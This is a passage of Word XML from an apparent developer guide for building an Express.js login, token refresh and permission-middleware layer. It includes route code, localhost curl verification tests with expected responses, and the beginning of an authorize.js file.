                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const express = require('express');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const validate = require('../../middleware/validate');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const { loginLimiter, refreshLimiter } = require('../../middleware/rateLimit');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const authenticate = require('../../middleware/authenticate');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const { loginSchema } = require('./auth.validators');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const ctrl = require('./auth.controller');</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const router = express.Router();</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router.post('/login',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  loginLimiter,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  validate(loginSchema, 'body'),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  ctrl.postLogin);</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router.post('/refresh',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  refreshLimiter,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  ctrl.postRefresh);     // CSRF + cookie checks live inside the controller</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router.post('/logout',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  authenticate,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  ctrl.postLogout);      // needs valid Bearer so audit row has a real employeeId</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module.exports = router;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>4.10  server.js — Mount the Auth Router</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src/server.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// added after the /healthz route in server.js</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const authRoutes = require('./modules/auth/auth.routes');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>app.use(`${env.API_BASE_PATH}/auth`, authRoutes);    // → /api/v1/auth/*</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>4.11  STEP 3 Verification Gate</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bash</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># Happy path — login</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>curl -X POST http://localhost:3000/api/v1/auth/login \</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     -H 'Content-Type: application/json' \</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     -d '{"employee_id":"SA79900","password":"SA79900"}' \</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     -i -c cookies.txt</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → 200 OK</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → Set-Cookie: cmcmis_rt=...; HttpOnly; Path=/api/v1/auth; SameSite=Lax</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → Set-Cookie: cmcmis_csrf=...; SameSite=Lax</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → {"data":{"accessToken":"...","csrfToken":"...","user":{...}}}</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Failure paths</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>curl -X POST http://localhost:3000/api/v1/auth/login \</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     -H 'Content-Type: application/json' \</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     -d '{"employee_id":"SA79900","password":"WRONG12"}'</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → 401 {"error":{"code":"UNAUTHORIZED","message":"Invalid credentials",...}}</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curl -X POST http://localhost:3000/api/v1/auth/login \</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     -H 'Content-Type: application/json' \</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     -d '{"employee_id":"abc","password":"x"}'</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → 422 {"error":{"code":"VALIDATION_ERROR",...,"details":[{path:"employee_id",...}]}}</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curl -X POST http://localhost:3000/api/v1/auth/refresh -b cookies.txt</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → 403 {"error":{"code":"FORBIDDEN","message":"CSRF token missing or mismatched"...}}</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SQL spot-check</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># SELECT outcome, COUNT(*) FROM final.login_audit</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>#  WHERE attempt_at &gt; NOW() - INTERVAL 5 MINUTE GROUP BY outcome;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → SUCCESS, FAILED_BAD_PASSWORD rows visible.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCFCE7"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="16A34A"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="16A34A"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">VERIFIED  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>STEP 3 acceptance</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>login returns 200 + cookies + JSON.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Wrong password → 401, audit row written with outcome FAILED_BAD_PASSWORD.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Malformed body → 422 with per-field details[].</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Refresh without X-CSRF-Token header → 403 CSRF mismatch.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>refresh_tokens row hash starts with 64 hex chars — never a raw JWT string.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="480" w:after="200"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="4" w:color="4F5DFF"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="4F5DFF"/>
          <w:sz w:val="48"/>
        </w:rPr>
        <w:t>Part V  ·  STEP 4  ·  JWT Middleware Layer (authorize.js)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="4B5563"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>authenticate.js and rateLimit.js were pulled forward during STEP 3 because the auth routes depend on them. The only genuinely new file in STEP 4 is authorize.js — the permission-gate factory used by every protected endpoint from now on.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>5.1  BR-RBAC-03 — Check Permissions, Not Roles</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FEF3C7"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="B45309"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="B45309"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">IMPORTANT  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>The locked rule</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>NEVER branch on req.user.role. Always branch on req.user.permissions.includes(code).</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Roles are convenience labels. Permissions are the atomic units the JWT actually carries.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Future role-permission edits then become CONFIG changes (Phase 3 seed file edits), not CODE refactors.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>5.2  authorize.js — Single-Permission + Any-Of Factories</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src/middleware/authorize.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const { errors } = require('./errorHandler');</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function authorize(permission) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (typeof permission !== 'string' || permission.length === 0) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    throw new Error('authorize(): permission must be a non-empty string');</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return function authorizeMiddleware(req, _res, next) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    if (!req.user || !Array.isArray(req.user.permissions)) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      return next(errors.unauthorized('Authentication required'));</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if (!req.user.permissions.includes(permission)) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      req.log?.warn?.({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        permission, employeeId: req.user.employeeId, role: req.user.role,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        permissionCount: req.user.permissions.length, path: req.originalUrl,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      }, 'Permission denied');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      return next(errors.forbidden(`Missing required permission: ${permission}`));</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return next();</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function authorizeAny(...permissions) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (permissions.length === 0 || permissions.some(p =&gt; typeof p !== 'string' || !p)) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    throw new Error('authorizeAny(): need one or more non-empty permission strings');</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return function authorizeAnyMiddleware(req, _res, next) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    if (!req.user || !Array.isArray(req.user.permissions)) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
